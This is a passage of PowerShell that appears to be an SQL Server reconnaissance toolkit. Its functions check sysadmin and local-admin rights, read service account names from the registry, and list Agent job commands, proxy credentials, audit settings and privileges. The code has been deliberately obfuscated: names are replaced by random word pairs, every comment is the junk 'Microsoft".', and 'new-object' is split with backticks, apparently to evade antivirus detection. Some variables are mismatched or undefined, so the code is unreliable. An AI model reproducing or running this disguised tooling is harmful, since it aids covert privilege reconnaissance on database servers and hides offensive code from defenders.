        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $BoringLarge = "SELECT    '$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],
            CASE
            WHEN IS_SRVROLEMEMBER('sysadmin') =  0 THEN 'No'
            ELSE 'Yes'
        END as IsSysadmin"

        # Microsoft".
        $BetterHorse = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $JuiceTrain = $JuiceTrain + $BetterHorse
    }

    End
    {
        # Microsoft".
        $JuiceTrain
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLLocalAdminCheck
{
    Begin
    {
    }

    Process
    {
        # Microsoft".
        $ClammyCanvas = [System.Security.Principal.WindowsIdentity]::GetCurrent()

        # Microsoft".
        $PinchRotten = $ClammyCanvas.name

        # Microsoft".
        $AbaftPowder = ne`w`-ob`je`ct -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($ClammyCanvas)

        # Microsoft".
        $TaxDelay = [System.Security.Principal.WindowsBuiltInRole]::Administrator        

        # Microsoft".
        $AbaftPowder.IsInRole($TaxDelay)
    }

    End
    {
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServiceAccount
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $CauseFish = ne`w`-ob`je`ct -TypeName System.Data.DataTable
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        if($LovingDry -eq 'Yes')
        {
            $SecondSecond = "
                -- Get SQL Server Browser - Static Location
                EXECUTE       master.dbo.xp_instance_regread
                @rootkey      = N'HKEY_LOCAL_MACHINE',
                @key          = N'SYSTEM\CurrentControlSet\Services\SQLBrowser',
                @value_name   = N'ObjectName',
                @value        = @BrowserLogin OUTPUT

                -- Get SQL Server Writer - Static Location
                EXECUTE       master.dbo.xp_instance_regread
                @rootkey      = N'HKEY_LOCAL_MACHINE',
                @key          = N'SYSTEM\CurrentControlSet\Services\SQLWriter',
                @value_name   = N'ObjectName',
                @value        = @WriterLogin OUTPUT

                -- Get MSOLAP - Calculated
                EXECUTE		master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @MSOLAPInstance,
                N'ObjectName',@AnalysisLogin OUTPUT

                -- Get Reporting - Calculated
                EXECUTE		master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @ReportInstance,
                N'ObjectName',@ReportLogin OUTPUT

                -- Get SQL Server DTS Server / Analysis - Calulated
                EXECUTE		master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @IntegrationVersion,
            N'ObjectName',@IntegrationDtsLogin OUTPUT"

            $EightCalm = '	,[BrowserLogin] = @BrowserLogin,
                [WriterLogin] = @WriterLogin,
                [AnalysisLogin] = @AnalysisLogin,
                [ReportLogin] = @ReportLogin,
            [IntegrationLogin] = @IntegrationDtsLogin'
        }
        else
        {
            $SecondSecond = ''
            $EightCalm = ''
        }

        # Microsoft".
        $BoringLarge = "  -- Setup variables
            DECLARE		@SQLServerInstance	VARCHAR(250)
            DECLARE		@MSOLAPInstance		VARCHAR(250)
            DECLARE		@ReportInstance 	VARCHAR(250)
            DECLARE		@AgentInstance	 	VARCHAR(250)
            DECLARE		@IntegrationVersion	VARCHAR(250)
            DECLARE		@DBEngineLogin		VARCHAR(100)
            DECLARE		@AgentLogin		VARCHAR(100)
            DECLARE		@BrowserLogin		VARCHAR(100)
            DECLARE     	@WriterLogin		VARCHAR(100)
            DECLARE		@AnalysisLogin		VARCHAR(100)
            DECLARE		@ReportLogin		VARCHAR(100)
            DECLARE		@IntegrationDtsLogin	VARCHAR(100)

            -- Get Service Paths for default and name instance
            if @@SERVICENAME = 'MSSQLSERVER' or @@SERVICENAME = HOST_NAME()
            BEGIN
            -- Default instance paths
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLServerOLAPService'
            set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer'
            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLSERVERAGENT'
            set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
            END
            ELSE
            BEGIN
            -- Named instance paths
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$' + cast(@@SERVICENAME as varchar(250))
            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSOLAP$' + cast(@@SERVICENAME as varchar(250))
            set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer$' + cast(@@SERVICENAME as varchar(250))
            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLAgent$' + cast(@@SERVICENAME as varchar(250))
            set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
            END

            -- Get SQL Server - Calculated
            EXECUTE		master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
            N'ObjectName',@DBEngineLogin OUTPUT

            -- Get SQL Server Agent - Calculated
            EXECUTE		master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @AgentInstance,
            N'ObjectName',@AgentLogin OUTPUT

            $SecondSecond

            -- Dislpay results
            SELECT		'$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],
            [DBEngineLogin] = @DBEngineLogin,
            [AgentLogin] = @AgentLogin
        $EightCalm"

        # Microsoft".
        $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $CauseFish = $CauseFish + $TradeSpicy
    }

    End
    {
        # Microsoft".
        $CauseFish
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLAgentJob
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs for specific subsystems.')]
         [ValidateSet("TSQL","PowerShell","CMDEXEC","PowerShell","ActiveScripting","ANALYSISCOMMAND","ANALYSISQUERY","Snapshot","Distribution","LogReader","Merge","QueueReader")]
        [String]$FlimsyBlind,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs that have a command that includes a specific keyword.')]
        [String]$UnusedStew,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs using a proxy credentials.')]
        [Switch]$LoadMug,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs using a specific proxy credential.')]
        [String]$LikeMice,
        
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        if(-not $RaggedQuill){
            Write-Verbose -Message "SQL Server Agent Job Search Starting..."
        }

        # Microsoft".
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')     
        $null = $TradeSpicy.Columns.Add('DatabaseName')
        $null = $TradeSpicy.Columns.Add('Job_Id')                                                                                                                                                                                        
        $null = $TradeSpicy.Columns.Add('Job_Name')                                                                                                                                                                                                 
        $null = $TradeSpicy.Columns.Add('Job_Description')  
        $null = $TradeSpicy.Columns.Add('Job_Owner')
        $null = $TradeSpicy.Columns.Add('Proxy_Id')  
        $null = $TradeSpicy.Columns.Add('Proxy_Credential')                                                                                                                                                                                                          
        $null = $TradeSpicy.Columns.Add('Date_Created') 
        $null = $TradeSpicy.Columns.Add('Last_Run_Date')
        $null = $TradeSpicy.Columns.Add('Enabled')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
        $null = $TradeSpicy.Columns.Add('Server')                                                                                                                                                                                        
        $null = $TradeSpicy.Columns.Add('Step_Name')
        $null = $TradeSpicy.Columns.Add('SubSystem')
        $null = $TradeSpicy.Columns.Add('Command')          
        
        # Microsoft".
        if($FlimsyBlind)
        {
            $IcicleRecord = " and steps.subsystem like '$FlimsyBlind'"
        }
        else
        {
            $NeedyUncle = ''
        }    
        
        # Microsoft".
        if($UnusedStew)
        {
            $PersonHusky = " and steps.command like '%$UnusedStew%'"
        }
        else
        {
            $PersonHusky = ''
        }   

        # Microsoft".
        if($LoadMug)
        {
            $KnockOwn = " and steps.proxy_id > 0"
        }
        else
        {
            $KnockOwn = ''
        } 
        
        # Microsoft".
        if($LikeMice)
        {
            $WatchHair = " and proxies.name like '$LikeMice'"
        }
        else
        {
            $WatchHair = ''
        }                                                                                                                                                                                                 
    }

    Process
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($PuffyCrack)
        {
            # Microsoft".
            $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace
        }
        else
        {
            # Microsoft".
            $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace
        }

        # Microsoft".
        try
        {
            # Microsoft".
            $ExtendSmelly.Open()
            if(-not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."                
            }

            # Microsoft".
            $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
            $JoyousLeft = $SmilePie.CurrentLogin
            $HauntGusty = $SmilePie.ComputerName
            $TinyBrief = $SmilePie.IsSysadmin

            # Microsoft".
            $BasinOafish = Get-SQLQuery -Instance $Instance -BoringLarge "SELECT 1 FROM sysprocesses WHERE LEFT(program_name, 8) = 'SQLAgent'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill
            if ($BasinOafish)
            {
                if(-not $RaggedQuill){
                    Write-Verbose -Message "$Instance : - SQL Server Agent service enabled."
                }
            }
            else
            {
                if(-not $RaggedQuill){
                    Write-Verbose -Message "$Instance : - SQL Server Agent service has not been started."
                }
            }

            # Microsoft".
            # Microsoft".
            $PourAwful = Get-SQLDatabaseRoleMember -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Instance $Instance -AjarInnate msdb  -RaggedQuill| ForEach-Object { 
                if($_.RolePrincipalName -match "SQLAgentUserRole|SQLAgentReaderRole|SQLAgentOperatorRole") {
                    if ($_.PrincipalName -eq $JoyousLeft) { $_ }
                }
            }

            if($BrightPushy -or ($TinyBrief -eq "Yes"))
            {
                if(-not $RaggedQuill){
                    Write-Verbose -Message "$Instance : - Attempting to list existing agent jobs as $JoyousLeft."
                }


                # Microsoft".
                $BoringLarge = "SELECT 	steps.database_name,
	                            job.job_id as [JOB_ID],
	                            job.name as [JOB_NAME],
	                            job.description as [JOB_DESCRIPTION],
								SUSER_SNAME(job.owner_sid) as [JOB_OWNER],
								steps.proxy_id,
								proxies.name as [proxy_account],
	                            job.enabled,
	                            steps.server,
	                            job.date_created,   
                                steps.last_run_date,								                             
								steps.step_name,
								steps.subsystem,
	                            steps.command
                            FROM [msdb].[dbo].[sysjobs] job
                            INNER JOIN [msdb].[dbo].[sysjobsteps] steps        
	                            ON job.job_id = steps.job_id
							left join [msdb].[dbo].[sysproxies] proxies
							 on steps.proxy_id = proxies.proxy_id
                            WHERE 1=1
                            $PersonHusky
                            $IcicleRecord
                            $WatchHair
                            $KnockOwn"

                # Microsoft".
                $RoughCobweb = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill
                
                # Microsoft".
                if(!($RoughCobweb)) {
                    Write-Verbose -Message "$Instance : - Either no jobs exist or the current login ($JoyousLeft) doesn't have the privileges to view them."
                    return
                }

                # Microsoft".
                $AcceptSignal = $RoughCobweb.rows.count
                if(-not $RaggedQuill){
                    Write-Verbose -Message "$Instance : - $AcceptSignal agent jobs found."
                }
                

                # Microsoft".
                $RoughCobweb | 
                ForEach-Object{
                    $null = $TradeSpicy.Rows.Add($HauntGusty,
                    $Instance,
                    $_.database_name,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
                    $_.JOB_ID,                                                                                                                                                                                        
                    $_.JOB_NAME, 
                    $_.JOB_DESCRIPTION,                                                                                                                                                                                                         
                    $_.JOB_OWNER,
                    $_.proxy_id,    
                    $_.proxy_account, 
                    $_.date_created,
                    $_.last_run_date,                                                                                                                                                                                  
                    $_.enabled,                                                                                                                                                                                                     
                    $_.server,                                                                                                                                                                                        
                    $_.step_name,
                    $_.subsystem,
                    $_.command)
                }
            }
            else
            {
                if(-not $RaggedQuill){
                    Write-Verbose -Message "$Instance : - The current login ($JoyousLeft) does not have any agent privileges."
                }
                return
            }

            # Microsoft".
            $ExtendSmelly.Close()

            # Microsoft".
            $ExtendSmelly.Dispose()

        }
        catch
        {
            # Microsoft".
            if(-not $RaggedQuill)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
                # Microsoft".
            }
        }        
    }

    End
    {
        if(-not $RaggedQuill){
            Write-Verbose -Message "SQL Server Agent Job Search Complete."
        }

        # Microsoft".
        $LateNeck = $TradeSpicy.rows.Count

        # Microsoft".
        $GripGate = $TradeSpicy | Group-Object SubSystem | Select Name, Count | Sort-Object Count -Descending

        # Microsoft".
        $OvalTrip = $TradeSpicy | Select-Object proxy_credential -Unique | Measure-Object | Select-Object Count -ExpandProperty Count

        # Microsoft".
        $UnpackCamera = $TradeSpicy | Select-Object ComputerName -Unique | Measure-Object |  Select-Object Count -ExpandProperty Count

        # Microsoft".
        $BurlyPlanes = $TradeSpicy | Select-Object Instance -Unique | Measure-Object |  Select-Object Count -ExpandProperty Count

        if(-not $RaggedQuill){
            Write-Verbose -Message "---------------------------------"
            Write-Verbose -Message "Agent Job Summary" 
            Write-Verbose -Message "---------------------------------"
            Write-Verbose -Message " $LateNeck jobs found"
            Write-Verbose -Message " $UnpackCamera affected systems"
            Write-Verbose -Message " $BurlyPlanes affected SQL Server instances"
            Write-Verbose -Message " $OvalTrip proxy credentials used"

            Write-Verbose -Message "---------------------------------"
            Write-Verbose -Message "Agent Job Summary by SubSystem" 
            Write-Verbose -Message "---------------------------------"
            $GripGate | 
            ForEach-Object {
                $MellowSon = $_.Name
                $TenseHeap = $_.Count
                Write-Verbose -Message " $TenseHeap $MellowSon Jobs"
            }
            Write-Verbose -Message " $LateNeck Total"
            Write-Verbose -Message "---------------------------------"
        }

        # Microsoft".
        $TradeSpicy
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLAuditDatabaseSpec
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit name.')]
        [string]$TanPowder,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Specification name.')]
        [string]$ShockCrow,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit action name.')]
        [string]$HorsesClub,



        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $OafishVoice = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($TanPowder)
        {
            $SupplyCast = " and a.name like '%$TanPowder%'"
        }
        else
        {
            $SupplyCast = ''
        }

        # Microsoft".
        if($ShockCrow)
        {
            $BestGuide = " and s.name like '%$ShockCrow%'"
        }
        else
        {
            $BestGuide = ''
        }

        # Microsoft".
        if($HorsesClub)
        {
            $HeadyGate = " and d.audit_action_name like '%$HorsesClub%'"
        }
        else
        {
            $HeadyGate = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }


        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }


        # Microsoft".
        $BoringLarge = "  SELECT  '$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],
            audit_id as [AuditId],
            a.name as [AuditName],
            s.name as [AuditSpecification],
            d.audit_action_id as [AuditActionId],
            d.audit_action_name as [AuditAction],
	        d.major_id,
	        OBJECT_NAME(d.major_id) as object,	
            s.is_state_enabled,
            d.is_group,
            s.create_date,
            s.modify_date,
            d.audited_result
            FROM sys.server_audits AS a
            JOIN sys.database_audit_specifications AS s
            ON a.audit_guid = s.audit_guid
            JOIN sys.database_audit_specification_details AS d
            ON s.database_specification_id = d.database_specification_id WHERE 1=1
            $SupplyCast
            $BestGuide
        $HeadyGate"

        # Microsoft".
        $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill

        # Microsoft".
        $OafishVoice = $OafishVoice + $TradeSpicy
    }

    End
    {
        # Microsoft".
        $OafishVoice
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLAuditServerSpec
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit name.')]
        [string]$TanPowder,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Specification name.')]
        [string]$ShockCrow,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit action name.')]
        [string]$HorsesClub,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $FlimsyIntend = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($TanPowder)
        {
            $SupplyCast = " and a.name like '%$TanPowder%'"
        }
        else
        {
            $SupplyCast = ''
        }

        # Microsoft".
        if($ShockCrow)
        {
            $BestGuide = " and s.name like '%$ShockCrow%'"
        }
        else
        {
            $BestGuide = ''
        }

        # Microsoft".
        if($HorsesClub)
        {
            $HeadyGate = " and d.audit_action_name like '%$HorsesClub%'"
        }
        else
        {
            $HeadyGate = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $BoringLarge = "  SELECT  '$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],
            audit_id as [AuditId],
            a.name as [AuditName],
            s.name as [AuditSpecification],
            d.audit_action_name as [AuditAction],
            s.is_state_enabled,
            d.is_group,
            d.audit_action_id as [AuditActionId],
            s.create_date,
            s.modify_date
            FROM sys.server_audits AS a
            JOIN sys.server_audit_specifications AS s
            ON a.audit_guid = s.audit_guid
            JOIN sys.server_audit_specification_details AS d
            ON s.server_specification_id = d.server_specification_id WHERE 1=1
            $SupplyCast
            $BestGuide
        $HeadyGate"

        # Microsoft".
        $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill

        # Microsoft".
        $FlimsyIntend  = $FlimsyIntend  + $TradeSpicy
    }

    End
    {
        # Microsoft".
        $FlimsyIntend
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServerPriv
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission name.')]
        [string]$WearyIsland,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $RipeBadge = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($WearyIsland)
        {
            $MournCheck = " WHERE PER.permission_name like '$WearyIsland'"
        }
        else
        {
            $MournCheck = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $BoringLarge = "  SELECT  '$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],
            GRE.name as [GranteeName],
            GRO.name as [GrantorName],
            PER.class_desc as [PermissionClass],
            PER.permission_name as [PermissionName],
            PER.state_desc as [PermissionState],
            COALESCE(PRC.name, EP.name, N'') as [ObjectName],
            COALESCE(PRC.type_desc, EP.type_desc, N'') as [ObjectType]
            FROM [sys].[server_permissions] as PER
            INNER JOIN sys.server_principals as GRO
            ON PER.grantor_principal_id = GRO.principal_id
            INNER JOIN sys.server_principals as GRE
            ON PER.grantee_principal_id = GRE.principal_id
            LEFT JOIN sys.server_principals as PRC
            ON PER.class = 101 AND PER.major_id = PRC.principal_id
            LEFT JOIN sys.endpoints AS EP
            ON PER.class = 105 AND PER.major_id = EP.endpoint_id
            $MournCheck
        ORDER BY GranteeName,PermissionName;"

        # Microsoft".
        $MixedRemain = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $RipeBadge = $RipeBadge + $MixedRemain
    }

    End
    {
        # Microsoft".
        $RipeBadge
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDatabasePriv
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name to filter for.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission name to filter for.')]
        [string]$WearyIsland,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission type to filter for.')]
        [string]$RingSilk,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name for grantee to filter for.')]
        [string]$BasinEnter,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Don't select permissions for default databases.")]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $GlassDrawer = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($WearyIsland)
        {
